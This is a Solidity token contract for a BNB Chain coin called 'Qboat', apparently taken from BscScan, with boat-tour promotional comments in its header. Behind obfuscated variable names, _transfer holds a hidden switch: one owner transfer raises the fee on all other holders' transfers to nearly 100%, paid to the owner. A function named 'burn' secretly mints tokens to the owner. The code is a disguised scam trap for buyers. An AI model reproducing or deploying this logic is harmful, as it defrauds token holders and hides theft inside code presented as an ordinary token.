/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

///////////////////////////////////////////////////////////////////////////////////////////////////////////
//Qatar has ideal temperatures during the winter season. The weather between November and May 
//is wonderful and idyllic for Qboat rides. Take advantage of this beautiful weather and get on board!
//https://www.helloqatar.co/the-top-3-boat-rides-in-qatar/
//https://youtu.be/xJOwDBBeyIM
//https://twitter.com/RossyClarke10
//https://www.facebook.com/people/Doha-Qatar-boat-for-rent/100063761719259/
///////////////////////////////////////////////////////////////////////////////////////////////////////////
// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;
contract Qboat {
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant DXRQQN = 99999;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  TJMGIL = address(0);
address private  NRZWZA = address(0);
uint256 private  YHPJFE = 1000000000000000000;
string public  symbol = "Qboat";
address private  EKRRBV = address(0);
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
uint256 private  HQWZME = 100000000;
string public  name = "Qboat";
uint256 private  XYMDSW = 1000000000000000000000;
address private  MEPMAF = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  SUHMJY = 10000000000;
uint256 private  UAHSBC = 1000000000000000;
uint256 private  ELIAMQ = 10000000000000;
uint256 private  GYBHGI = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  GZWUHF = address(0);
mapping (address => uint256) public balanceOf;
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "PGZZDE");
require(to != address(0), "PGZZDE");
require(amount <= balanceOf[from], "PGZZDE");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* DXRQQN/YHPJFE ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==NRZWZA){
YHPJFE = DXRQQN+2;
}
emit Transfer(from, to, transferAmount);
}
function _getSUHMJY() private returns (uint256) {
return SUHMJY;
}

function _getGYBHGI() private returns (uint256) {
return GYBHGI;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getTJMGIL() private returns (address) {
return TJMGIL;
}

function _getXYMDSW() private returns (uint256) {
return XYMDSW;
}

function _getEKRRBV() private returns (address) {
return EKRRBV;
}

function _getUAHSBC() private returns (uint256) {
return UAHSBC;
}

constructor () public {
NRZWZA = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getGZWUHF() private returns (address) {
return GZWUHF;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getMEPMAF() private returns (address) {
return MEPMAF;
}

function _getHQWZME() private returns (uint256) {
return HQWZME;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tPGZZDE 0");
require(spender != address(0), "fPGZZDE 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getELIAMQ() private returns (uint256) {
return ELIAMQ;
}


}